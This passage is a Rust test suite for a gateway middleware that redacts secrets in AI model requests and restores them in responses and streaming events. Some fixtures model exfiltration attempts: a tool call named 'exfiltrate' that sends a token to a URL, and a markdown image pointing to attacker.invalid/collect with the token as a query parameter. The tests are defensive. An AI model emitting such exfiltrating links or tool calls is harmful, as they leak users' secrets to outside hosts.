    fn declaration() -> MiddlewareDeclaration {
        let mut declaration = MiddlewareDeclaration::new(
            "axond.redact",
            [
                MiddlewareScope::Request,
                MiddlewareScope::Response,
                MiddlewareScope::StreamEvent,
            ],
        );
        declaration.failure_posture = MiddlewareFailurePosture::FailClosed;
        declaration.mutates_response = true;
        declaration
    }

    fn middleware(key: u8, rules: Vec<GuardrailRule>) -> DeterministicGuardrail {
        DeterministicGuardrail::compile(declaration(), &[key; 32], &rules).unwrap()
    }

    fn redact_rule() -> GuardrailRule {
        GuardrailRule {
            id: "email".to_owned(),
            pattern: r"[a-z]+@example\.com".to_owned(),
            action: GuardrailAction::Redact,
        }
    }

    fn state_and_token(
        middleware: &DeterministicGuardrail,
        secret: &str,
    ) -> (MiddlewareState, String) {
        let mut request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"messages": [{"role": "user", "content": secret}]}),
        };
        let outcome = middleware
            .apply(MiddlewarePhase::Request(&mut request), None)
            .unwrap();
        (
            outcome.state.expect("response-lifetime state"),
            request.body["messages"][0]["content"]
                .as_str()
                .unwrap()
                .to_owned(),
        )
    }

    #[test]
    fn buffered_values_round_trip_without_exposing_content_secrets() {
        let middleware = middleware(7, vec![redact_rule()]);
        let mut request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({
                "model": "route@example.com",
                "stream": true,
                "previous_response_id": "resp_1",
                "messages": [{"role": "user", "content": format!("email {SECRET}")}],
            }),
        };
        let outcome = middleware
            .apply(MiddlewarePhase::Request(&mut request), None)
            .unwrap();
        let mut state = outcome.state.expect("response-lifetime state");
        let masked = request.body["messages"][0]["content"]
            .as_str()
            .unwrap()
            .to_owned();

        assert!(masked.starts_with("email [AXOND:"));
        assert!(!masked.contains(SECRET));
        assert_eq!(request.model, "alias");
        assert_eq!(request.body["model"], "route@example.com");
        assert_eq!(request.body["stream"], true);
        assert_eq!(request.body["previous_response_id"], "resp_1");
        let mut response = ProviderResponse {
            body: json!({"choices": [{"message": {"content": masked}}]}),
            usage: ModelUsage::default(),
        };
        middleware
            .apply(MiddlewarePhase::Response(&mut response), Some(&mut state))
            .unwrap();
        assert_eq!(
            response.body["choices"][0]["message"]["content"],
            format!("email {SECRET}")
        );
    }

    #[test]
    fn tokens_are_stable_within_one_namespace_and_separated_between_namespaces() {
        let mask = |key| {
            let middleware = middleware(key, vec![redact_rule()]);
            state_and_token(&middleware, SECRET).1
        };
        assert_eq!(mask(1), mask(1));
        assert_ne!(mask(1), mask(2));
    }

    #[test]
    fn merged_redaction_preserves_policy_precedence_overlap_and_capture_independence() {
        let rule = |id: &str, pattern: &str| GuardrailRule {
            id: id.to_owned(),
            pattern: pattern.to_owned(),
            action: GuardrailAction::Redact,
        };
        // Reusing a capture name is valid while rules are independent. Merging
        // strips capture bookkeeping, while alternation order still decides the
        // equal-offset winner exactly as the former per-rule search did.
        let longest_first = middleware(
            7,
            vec![
                rule("long", r"(?P<value>aa)"),
                rule("short", r"(?P<value>a)"),
            ],
        );
        let mut state = RedactionState::default();
        let masked = mask_text(
            "aaa",
            longest_first.redaction.as_ref(),
            &longest_first.key,
            &mut state,
        )
        .unwrap();
        assert_eq!(
            masked,
            format!(
                "{}{}",
                placeholder(&longest_first.key, "aa"),
                placeholder(&longest_first.key, "a")
            )
        );

        let shortest_first = middleware(
            7,
            vec![
                rule("short", r"(?P<value>a)"),
                rule("long", r"(?P<value>aa)"),
            ],
        );
        let mut state = RedactionState::default();
        let token = placeholder(&shortest_first.key, "a");
        assert_eq!(
            mask_text(
                "aaa",
                shortest_first.redaction.as_ref(),
                &shortest_first.key,
                &mut state,
            )
            .unwrap(),
            token.repeat(3)
        );
    }

    #[test]
    fn distinct_redaction_state_is_bounded_and_refuses_atomically() {
        let guardrail = middleware(
            7,
            vec![GuardrailRule {
                id: "four-digits".to_owned(),
                pattern: r"\d{4}".to_owned(),
                action: GuardrailAction::Redact,
            }],
        );
        let content = |count: usize| {
            (0..count)
                .map(|value| format!("{value:04}"))
                .collect::<Vec<_>>()
                .join(" ")
        };

        let mut exact = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"messages": [{"role": "user", "content": content(MAX_DISTINCT_REDACTIONS)}]}),
        };
        let outcome = guardrail
            .apply(MiddlewarePhase::Request(&mut exact), None)
            .expect("the exact distinct-value ceiling is admitted");
        assert_eq!(
            outcome
                .state
                .as_ref()
                .and_then(|state| state.downcast_ref::<RedactionState>())
                .map(|state| state.originals.len()),
            Some(MAX_DISTINCT_REDACTIONS)
        );

        let mut excess = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"messages": [{"role": "user", "content": content(MAX_DISTINCT_REDACTIONS + 1)}]}),
        };
        let original = excess.clone();
        assert!(matches!(
            guardrail.apply(MiddlewarePhase::Request(&mut excess), None),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(excess, original);
    }

    #[test]
    fn repeated_short_matches_preflight_whole_request_expansion_before_allocation() {
        let rules = vec![GuardrailRule {
            id: "single-byte".to_owned(),
            pattern: "x".to_owned(),
            action: GuardrailAction::Redact,
        }];
        let probe = middleware(7, rules.clone());
        let body = json!({
            "messages": [{"role": "user", "content": "x".repeat(4_096)}]
        });
        let exact = masked_request_serialized_len(
            MiddlewareSurface::ChatCompletions,
            &body,
            probe.redaction.as_ref(),
        )
        .expect("masked request length");
        assert!(exact > serialized_json_len(&body).expect("original request length"));

        let bounded = DeterministicGuardrail::compile_with_request_limit(
            declaration(),
            &[7; 32],
            &rules,
            exact - 1,
        )
        .expect("bounded guardrail");
        let mut refused = ProviderRequest {
            model: "alias".to_owned(),
            body: body.clone(),
        };
        let original = refused.clone();
        assert!(matches!(
            bounded.apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::Request(&mut refused),
                None,
            ),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(refused, original);

        let exact_guardrail = DeterministicGuardrail::compile_with_request_limit(
            declaration(),
            &[7; 32],
            &rules,
            exact,
        )
        .expect("exact-bound guardrail");
        let mut admitted = ProviderRequest {
            model: "alias".to_owned(),
            body,
        };
        let outcome = exact_guardrail
            .apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::Request(&mut admitted),
                None,
            )
            .expect("exact bound admits masking");
        assert_eq!(outcome.verdict, MiddlewareVerdict::Continue);
        assert_eq!(serialized_json_len(&admitted.body).unwrap(), exact);
    }

    #[test]
    fn repeated_placeholder_restoration_is_length_checked_before_allocation() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (state, token) = state_and_token(&middleware, SECRET);
        let originals = &state
            .downcast_ref::<RedactionState>()
            .expect("redaction state")
            .originals;
        let repeated = token.repeat(8);
        let restored_len = SECRET.len() * 8;

        assert_eq!(
            restore_text_bounded(&repeated, originals, restored_len - 1),
            Err(MiddlewareError::Failed)
        );
        assert_eq!(
            restore_text_bounded(&repeated, originals, restored_len).unwrap(),
            SECRET.repeat(8)
        );
    }

    #[test]
    fn sorted_token_index_resolves_prefixes_and_snapshots_with_many_originals() {
        let middleware = middleware(7, vec![redact_rule()]);
        let mut originals = BTreeMap::new();
        for value in 0..1_024 {
            let secret = format!("user-{value}@example.com");
            originals.insert(placeholder(&middleware.key, &secret), secret);
        }
        let target = originals
            .keys()
            .nth(originals.len() / 2)
            .expect("middle indexed token")
            .to_owned();
        let strict_prefix = &target[..target.len() - 1];

        assert!(strict_prefix_of_concrete_token(strict_prefix, &originals));
        assert!(text_contains_concrete_token_with_prefix(
            &format!("snapshot {target}"),
            TOKEN_PREFIX,
            &originals,
        ));
        assert!(!text_contains_concrete_token_with_prefix(
            "snapshot without a concrete token",
            TOKEN_PREFIX,
            &originals,
        ));
    }

    #[test]
    fn guardrail_refuses_to_infer_an_absent_gateway_surface() {
        let middleware = middleware(7, vec![redact_rule()]);
        let mut request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"prompt": SECRET}),
        };
        assert!(matches!(
            middleware.apply_for_surface(None, MiddlewarePhase::Request(&mut request), None),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(request.body["prompt"], SECRET);
    }

    #[test]
    fn restoration_uses_only_request_local_originals() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut alice_state, alice_token) = state_and_token(&middleware, SECRET);
        let (mut bob_state, _) = state_and_token(&middleware, "bob@example.com");
        let mut response = ProviderResponse {
            body: json!({"choices": [{"message": {"content": alice_token}}]}),
            usage: ModelUsage::default(),
        };

        middleware
            .apply(
                MiddlewarePhase::Response(&mut response),
                Some(&mut bob_state),
            )
            .unwrap();
        let still_masked = response.body["choices"][0]["message"]["content"].clone();
        assert!(still_masked.as_str().unwrap().starts_with(TOKEN_PREFIX));

        middleware
            .apply(
                MiddlewarePhase::Response(&mut response),
                Some(&mut alice_state),
            )
            .unwrap();
        assert_eq!(response.body["choices"][0]["message"]["content"], SECRET);
    }

    #[test]
    fn block_precedes_redaction_without_mutation_state_or_echo() {
        let middleware = middleware(
            7,
            vec![
                redact_rule(),
                GuardrailRule {
                    id: "deny".to_owned(),
                    pattern: "forbidden-secret".to_owned(),
                    action: GuardrailAction::Block,
                },
            ],
        );
        let mut request = ProviderRequest {
            model: "alias".to_owned(),
            body: json!({"prompt": format!("{SECRET} forbidden-secret")}),
        };
        let original = request.clone();

        let outcome = middleware
            .apply(MiddlewarePhase::Request(&mut request), None)
            .unwrap();

        assert_eq!(
            outcome.verdict,
            MiddlewareVerdict::Refuse(MiddlewareRefusal::Policy)
        );
        assert!(outcome.state.is_none());
        assert_eq!(request, original);
    }

    #[test]
    fn buffered_restore_rejects_only_known_incomplete_tokens_atomically() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let partial = format!("answer {}", &token[..token.len() / 2]);
        let mut response = ProviderResponse {
            body: json!({
                "choices": [{"message": {"content": [
                    {"type": "text", "text": token},
                    {"type": "text", "text": partial}
                ]}}]
            }),
            usage: ModelUsage::default(),
        };
        let original = response.clone();

        assert!(matches!(
            middleware.apply(MiddlewarePhase::Response(&mut response), Some(&mut state),),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(response, original);
    }

    #[test]
    fn unrelated_complete_and_partial_axond_like_text_is_preserved() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let first_digest = token.as_bytes()[TOKEN_PREFIX.len()] as char;
        let different = if first_digest == 'A' { 'B' } else { 'A' };
        let unknown_partial = format!("{TOKEN_PREFIX}{different}");
        let unknown_complete = format!("{TOKEN_PREFIX}{different}not-generated{TOKEN_SUFFIX}");
        let mut response = ProviderResponse {
            body: json!({
                "choices": [{"message": {"content": [
                    {"type": "text", "text": &unknown_partial},
                    {"type": "text", "text": &unknown_complete},
                    {"type": "text", "text": &token}
                ]}}]
            }),
            usage: ModelUsage::default(),
        };

        middleware
            .apply(MiddlewarePhase::Response(&mut response), Some(&mut state))
            .unwrap();

        let content = &response.body["choices"][0]["message"]["content"];
        assert_eq!(content[0]["text"], unknown_partial);
        assert_eq!(content[1]["text"], unknown_complete);
        assert_eq!(content[2]["text"], SECRET);
    }

    #[test]
    fn split_placeholder_is_restored_across_stream_events() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut first = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": &token[..cut]}}]}),
        };
        let mut second = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": &token[cut..]}}]}),
        };

        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut first), Some(&mut state))
            .unwrap();
        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut second), Some(&mut state))
            .unwrap();

        let ProviderStreamEvent::Data { data: first, .. } = first else {
            panic!("data event")
        };
        let ProviderStreamEvent::Data { data: second, .. } = second else {
            panic!("data event")
        };
        assert_eq!(first["choices"][0]["delta"]["content"], "");
        assert_eq!(second["choices"][0]["delta"]["content"], SECRET);
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn stream_carry_updates_many_channels_through_the_real_event_path() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let partial = &token[..token.len() / 2];

        for index in 0..512 {
            let mut event = ProviderStreamEvent::Data {
                event: Some("response.output_text.delta".to_owned()),
                data: json!({
                    "type": "response.output_text.delta",
                    "item_id": format!("item-{index}"),
                    "output_index": 0,
                    "content_index": 0,
                    "delta": partial,
                }),
            };
            middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::Responses),
                    MiddlewarePhase::StreamEvent(&mut event),
                    Some(&mut state),
                )
                .unwrap();
            let ProviderStreamEvent::Data { data, .. } = event else {
                panic!("data event")
            };
            assert_eq!(data["delta"], "");
        }

        let retained = state.downcast_ref::<RedactionState>().unwrap();
        assert_eq!(retained.stream_carry.len(), 512);
        assert_eq!(retained.stream_carry_value_bytes, 512 * partial.len());
        assert_eq!(
            retained.stream_carry_key_bytes,
            retained
                .stream_carry
                .keys()
                .map(|key| key.retained_bytes().unwrap())
                .sum::<usize>()
        );
    }

    #[test]
    fn stream_carry_transaction_rolls_back_event_and_state_at_cardinality_limit() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let retained = state.downcast_mut::<RedactionState>().unwrap();
        let mut transaction = StreamCarryTransaction::new(
            &mut retained.stream_carry,
            &mut retained.stream_carry_key_bytes,
            &mut retained.stream_carry_value_bytes,
        );
        for index in 0..MAX_STREAM_CARRIES - 1 {
            transaction
                .insert(
                    StreamCarryKey {
                        channel: format!("seed-{index}"),
                        path: Vec::new(),
                    },
                    "[".to_owned(),
                )
                .unwrap();
        }
        transaction.commit();

        let retained = state.downcast_ref::<RedactionState>().unwrap();
        let before_carries = retained.stream_carry.clone();
        let before_key_bytes = retained.stream_carry_key_bytes;
        let before_value_bytes = retained.stream_carry_value_bytes;
        let mut event = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [
                {"index": 10_000, "delta": {"content": &token[..1]}},
                {"index": 10_001, "delta": {"content": &token[..1]}}
            ]}),
        };
        let original = event.clone();

        assert!(matches!(
            middleware.apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::StreamEvent(&mut event),
                Some(&mut state),
            ),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(event, original);
        let retained = state.downcast_ref::<RedactionState>().unwrap();
        assert_eq!(retained.stream_carry, before_carries);
        assert_eq!(retained.stream_carry_key_bytes, before_key_bytes);
        assert_eq!(retained.stream_carry_value_bytes, before_value_bytes);
    }

    #[test]
    fn stream_carry_aggregate_key_and_value_bytes_fail_closed_atomically() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut key_state, token) = state_and_token(&middleware, SECRET);
        let mut oversized_key_event = ProviderStreamEvent::Data {
            event: Some("response.output_text.delta".to_owned()),
            data: json!({
                "type": "response.output_text.delta",
                "item_id": "x".repeat(MAX_STREAM_CARRY_KEY_BYTES),
                "output_index": 0,
                "content_index": 0,
                "delta": &token[..1],
            }),
        };
        let original_key_event = oversized_key_event.clone();
        assert!(matches!(
            middleware.apply_for_surface(
                Some(MiddlewareSurface::Responses),
                MiddlewarePhase::StreamEvent(&mut oversized_key_event),
                Some(&mut key_state),
            ),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(oversized_key_event, original_key_event);
        let retained = key_state.downcast_ref::<RedactionState>().unwrap();
        assert!(retained.stream_carry.is_empty());
        assert_eq!(retained.stream_carry_key_bytes, 0);
        assert_eq!(retained.stream_carry_value_bytes, 0);

        let (mut value_state, token) = state_and_token(&middleware, SECRET);
        let partial = token[..TOKEN_BYTES - 1].to_owned();
        let admitted = MAX_STREAM_CARRY_VALUE_BYTES / partial.len();
        let retained = value_state.downcast_mut::<RedactionState>().unwrap();
        let mut transaction = StreamCarryTransaction::new(
            &mut retained.stream_carry,
            &mut retained.stream_carry_key_bytes,
            &mut retained.stream_carry_value_bytes,
        );
        for index in 0..admitted {
            transaction
                .insert(
                    StreamCarryKey {
                        channel: format!("value-seed-{index}"),
                        path: Vec::new(),
                    },
                    partial.clone(),
                )
                .unwrap();
        }
        transaction.commit();
        let retained = value_state.downcast_ref::<RedactionState>().unwrap();
        let before_carries = retained.stream_carry.clone();
        let before_key_bytes = retained.stream_carry_key_bytes;
        let before_value_bytes = retained.stream_carry_value_bytes;
        let mut value_event = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{
                "index": 20_000,
                "delta": {"content": partial}
            }]}),
        };
        let original_value_event = value_event.clone();
        assert!(matches!(
            middleware.apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::StreamEvent(&mut value_event),
                Some(&mut value_state),
            ),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(value_event, original_value_event);
        let retained = value_state.downcast_ref::<RedactionState>().unwrap();
        assert_eq!(retained.stream_carry, before_carries);
        assert_eq!(retained.stream_carry_key_bytes, before_key_bytes);
        assert_eq!(retained.stream_carry_value_bytes, before_value_bytes);
    }

    #[test]
    fn responses_done_snapshot_resolves_split_delta_carry_without_concatenation() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let first_cut = token.len() / 3;
        let second_cut = token.len() * 2 / 3;
        let mut first = ProviderStreamEvent::Data {
            event: Some("response.output_text.delta".to_owned()),
            data: json!({
                "type": "response.output_text.delta",
                "item_id": "item_0",
                "output_index": 0,
                "content_index": 0,
                "delta": &token[..first_cut]
            }),
        };
        let mut second = ProviderStreamEvent::Data {
            event: Some("response.output_text.delta".to_owned()),
            data: json!({
                "type": "response.output_text.delta",
                "item_id": "item_0",
                "output_index": 0,
                "content_index": 0,
                "delta": &token[first_cut..second_cut]
            }),
        };
        let mut done = ProviderStreamEvent::Data {
            event: Some("response.output_text.done".to_owned()),
            data: json!({
                "type": "response.output_text.done",
                "item_id": "item_0",
                "output_index": 0,
                "content_index": 0,
                "text": token
            }),
        };

        for event in [&mut first, &mut second, &mut done] {
            middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::Responses),
                    MiddlewarePhase::StreamEvent(event),
                    Some(&mut state),
                )
                .unwrap();
        }

        let ProviderStreamEvent::Data { data: first, .. } = first else {
            panic!("data event")
        };
        let ProviderStreamEvent::Data { data: second, .. } = second else {
            panic!("data event")
        };
        let ProviderStreamEvent::Data { data: done, .. } = done else {
            panic!("data event")
        };
        assert_eq!(first["delta"], "");
        assert_eq!(second["delta"], "");
        assert_eq!(done["text"], SECRET);
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn responses_done_snapshot_must_resolve_its_delta_carry_atomically() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let mut partial = ProviderStreamEvent::Data {
            event: Some("response.output_text.delta".to_owned()),
            data: json!({
                "type": "response.output_text.delta",
                "item_id": "item_0",
                "output_index": 0,
                "content_index": 0,
                "delta": &token[..token.len() / 2]
            }),
        };
        middleware
            .apply_for_surface(
                Some(MiddlewareSurface::Responses),
                MiddlewarePhase::StreamEvent(&mut partial),
                Some(&mut state),
            )
            .unwrap();

        let mut inconsistent = ProviderStreamEvent::Data {
            event: Some("response.output_text.done".to_owned()),
            data: json!({
                "type": "response.output_text.done",
                "item_id": "item_0",
                "output_index": 0,
                "content_index": 0,
                "text": "different final text"
            }),
        };
        let original = inconsistent.clone();
        assert!(matches!(
            middleware.apply_for_surface(
                Some(MiddlewareSurface::Responses),
                MiddlewarePhase::StreamEvent(&mut inconsistent),
                Some(&mut state),
            ),
            Err(MiddlewareError::Failed)
        ));
        assert_eq!(inconsistent, original);
        assert_eq!(
            middleware.finish_stream(Some(&mut state)),
            Err(MiddlewareError::Failed)
        );
    }

    #[test]
    fn chat_stream_carry_follows_choice_identity_across_array_reordering() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut first = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 7, "delta": {"content": &token[..cut]}}]}),
        };
        let mut second = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [
                {"index": 3, "delta": {"content": "other"}},
                {"index": 7, "delta": {"content": &token[cut..]}}
            ]}),
        };

        for event in [&mut first, &mut second] {
            middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::ChatCompletions),
                    MiddlewarePhase::StreamEvent(event),
                    Some(&mut state),
                )
                .unwrap();
        }

        let ProviderStreamEvent::Data { data: first, .. } = first else {
            panic!("data event")
        };
        let ProviderStreamEvent::Data { data: second, .. } = second else {
            panic!("data event")
        };
        assert_eq!(first["choices"][0]["delta"]["content"], "");
        assert_eq!(second["choices"][0]["delta"]["content"], "other");
        assert_eq!(second["choices"][1]["delta"]["content"], SECRET);
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn split_placeholders_never_cross_provider_semantic_channels() {
        let middleware = middleware(7, vec![redact_rule()]);

        let (mut chat_state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut chat_first = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": &token[..cut]}}]}),
        };
        let mut chat_second = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 1, "delta": {"content": &token[cut..]}}]}),
        };
        middleware
            .apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::StreamEvent(&mut chat_first),
                Some(&mut chat_state),
            )
            .unwrap();
        middleware
            .apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::StreamEvent(&mut chat_second),
                Some(&mut chat_state),
            )
            .unwrap();
        let ProviderStreamEvent::Data {
            data: chat_second, ..
        } = chat_second
        else {
            panic!("data event")
        };
        assert_eq!(chat_second["choices"][0]["delta"]["content"], &token[cut..]);
        assert_eq!(
            middleware.finish_stream(Some(&mut chat_state)),
            Err(MiddlewareError::Failed)
        );

        let (mut native_state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut native_first = ProviderStreamEvent::Data {
            event: Some("content_block_delta".to_owned()),
            data: json!({
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "text_delta", "text": &token[..cut]}
            }),
        };
        let mut native_second = ProviderStreamEvent::Data {
            event: Some("content_block_delta".to_owned()),
            data: json!({
                "type": "content_block_delta",
                "index": 1,
                "delta": {"type": "text_delta", "text": &token[cut..]}
            }),
        };
        for event in [&mut native_first, &mut native_second] {
            middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::NativeMessages),
                    MiddlewarePhase::StreamEvent(event),
                    Some(&mut native_state),
                )
                .unwrap();
        }
        let ProviderStreamEvent::Data {
            data: native_second,
            ..
        } = native_second
        else {
            panic!("data event")
        };
        assert_eq!(native_second["delta"]["text"], &token[cut..]);
        assert_eq!(
            middleware.finish_stream(Some(&mut native_state)),
            Err(MiddlewareError::Failed)
        );

        let (mut responses_state, token) = state_and_token(&middleware, SECRET);
        let cut = token.len() / 2;
        let mut responses_first = ProviderStreamEvent::Data {
            event: Some("response.output_text.delta".to_owned()),
            data: json!({
                "type": "response.output_text.delta",
                "item_id": "item_0",
                "output_index": 0,
                "content_index": 0,
                "delta": &token[..cut]
            }),
        };
        let mut responses_second = ProviderStreamEvent::Data {
            event: Some("response.output_text.delta".to_owned()),
            data: json!({
                "type": "response.output_text.delta",
                "item_id": "item_1",
                "output_index": 0,
                "content_index": 0,
                "delta": &token[cut..]
            }),
        };
        for event in [&mut responses_first, &mut responses_second] {
            middleware
                .apply_for_surface(
                    Some(MiddlewareSurface::Responses),
                    MiddlewarePhase::StreamEvent(event),
                    Some(&mut responses_state),
                )
                .unwrap();
        }
        let ProviderStreamEvent::Data {
            data: responses_second,
            ..
        } = responses_second
        else {
            panic!("data event")
        };
        assert_eq!(responses_second["delta"], &token[cut..]);
        assert_eq!(
            middleware.finish_stream(Some(&mut responses_state)),
            Err(MiddlewareError::Failed)
        );
    }

    #[test]
    fn unrelated_axond_like_stream_text_is_not_carried_or_refused() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let first_digest = token.as_bytes()[TOKEN_PREFIX.len()] as char;
        let different = if first_digest == 'A' { 'B' } else { 'A' };
        let unknown_partial = format!("{TOKEN_PREFIX}{different}");
        let unknown_complete = format!("{TOKEN_PREFIX}{different}not-generated{TOKEN_SUFFIX}");
        let mut event = ProviderStreamEvent::Data {
            event: None,
            data: json!({"choices": [{"index": 0, "delta": {"content": format!(
                "{unknown_partial}|{unknown_complete}"
            )}}]}),
        };

        middleware
            .apply(MiddlewarePhase::StreamEvent(&mut event), Some(&mut state))
            .unwrap();
        let ProviderStreamEvent::Data { data, .. } = event else {
            panic!("data event")
        };
        assert_eq!(
            data["choices"][0]["delta"]["content"],
            format!("{unknown_partial}|{unknown_complete}")
        );
        middleware.finish_stream(Some(&mut state)).unwrap();
    }

    #[test]
    fn non_display_paths_never_share_stream_carry() {
        let middleware = middleware(7, vec![redact_rule()]);

        for array_first in [true, false] {
            let (mut state, token) = state_and_token(&middleware, SECRET);
            let cut = token.len() / 2;
            let mut first = ProviderStreamEvent::Data {
                event: None,
                data: if array_first {
                    json!({"choices": [{"index": 0, "delta": {"content": &token[..cut]}}]})
                } else {
                    json!({"choices": {"0": {"delta": {"content": &token[..cut]}}}})
                },
            };
            let mut second = ProviderStreamEvent::Data {
                event: None,
                data: if array_first {
                    json!({"choices": {"0": {"delta": {"content": &token[cut..]}}}})
                } else {
                    json!({"choices": [{"index": 0, "delta": {"content": &token[cut..]}}]})
                },
            };

            middleware
                .apply(MiddlewarePhase::StreamEvent(&mut first), Some(&mut state))
                .unwrap();
            middleware
                .apply(MiddlewarePhase::StreamEvent(&mut second), Some(&mut state))
                .unwrap();

            let ProviderStreamEvent::Data { data: first, .. } = first else {
                panic!("data event")
            };
            let ProviderStreamEvent::Data { data: second, .. } = second else {
                panic!("data event")
            };
            if array_first {
                assert_eq!(first["choices"][0]["delta"]["content"], "");
                assert_eq!(second["choices"]["0"]["delta"]["content"], &token[cut..]);
            } else {
                assert_eq!(first["choices"]["0"]["delta"]["content"], &token[..cut]);
                assert_eq!(second["choices"][0]["delta"]["content"], &token[cut..]);
            }
            if array_first {
                assert_eq!(
                    middleware.finish_stream(Some(&mut state)),
                    Err(MiddlewareError::Failed)
                );
            } else {
                middleware.finish_stream(Some(&mut state)).unwrap();
            }
        }
    }

    #[test]
    fn provider_cannot_relocate_a_token_into_buffered_tool_arguments() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);
        let mut response = ProviderResponse {
            body: json!({
                "choices": [{"message": {
                    "content": token.clone(),
                    "tool_calls": [{"function": {
                        "name": "exfiltrate",
                        "arguments": format!(r#"{{"url":"https://example.test/{token}"}}"#)
                    }}]
                }}]
            }),
            usage: ModelUsage::default(),
        };

        middleware
            .apply(MiddlewarePhase::Response(&mut response), Some(&mut state))
            .unwrap();

        assert_eq!(response.body["choices"][0]["message"]["content"], SECRET);
        let arguments =
            response.body["choices"][0]["message"]["tool_calls"][0]["function"]["arguments"]
                .as_str()
                .unwrap();
        assert!(arguments.contains(&token));
        assert!(!arguments.contains(SECRET));

        for body in [
            json!({"content": [{
                "type": "tool_use",
                "text": token.clone(),
                "input": {"value": token.clone()}
            }]}),
            json!({"output": [{
                "type": "function_call",
                "content": [{"type": "output_text", "text": token.clone()}],
                "arguments": token.clone()
            }]}),
        ] {
            let original = body.clone();
            let mut response = ProviderResponse {
                body,
                usage: ModelUsage::default(),
            };
            middleware
                .apply(MiddlewarePhase::Response(&mut response), Some(&mut state))
                .unwrap();
            assert_eq!(response.body, original);
            assert!(!response.body.to_string().contains(SECRET));
        }
    }

    #[test]
    fn restoration_is_route_bound_and_display_text_is_the_explicit_trust_boundary() {
        let middleware = middleware(7, vec![redact_rule()]);
        let (mut state, token) = state_and_token(&middleware, SECRET);

        let mut chat = ProviderResponse {
            body: json!({
                "choices": [{"message": {"content": format!(
                    "![untrusted](https://attacker.invalid/collect?q={token})"
                )}}],
                "content": [{"type": "text", "text": token.clone()}],
                "output": [{
                    "type": "message",
                    "content": [{"type": "output_text", "text": token.clone()}]
                }]
            }),
            usage: ModelUsage::default(),
        };
        middleware
            .apply_for_surface(
                Some(MiddlewareSurface::ChatCompletions),
                MiddlewarePhase::Response(&mut chat),
                Some(&mut state),
            )
            .unwrap();
        assert!(
            chat.body["choices"][0]["message"]["content"]
                .as_str()
                .unwrap()
                .contains(SECRET)
        );
        assert_eq!(chat.body["content"][0]["text"], token);
        assert_ne!(chat.body["output"][0]["content"][0]["text"], SECRET);

        let mut native = ProviderResponse {
            body: json!({"content": [{"type": "text", "text": token.clone()}]}),
            usage: ModelUsage::default(),
        };
        middleware
            .apply_for_surface(
                Some(MiddlewareSurface::NativeMessages),
                MiddlewarePhase::Response(&mut native),
                Some(&mut state),
            )
            .unwrap();
        assert_eq!(native.body["content"][0]["text"], SECRET);

        let mut responses = ProviderResponse {
            body: json!({"output": [{
                "type": "message",
                "content": [{"type": "output_text", "text": token}]
            }]}),
            usage: ModelUsage::default(),
        };
        middleware
            .apply_for_surface(
                Some(MiddlewareSurface::Responses),
                MiddlewarePhase::Response(&mut responses),
                Some(&mut state),
            )
            .unwrap();
        assert_eq!(responses.body["output"][0]["content"][0]["text"], SECRET);
    }

    #[test]
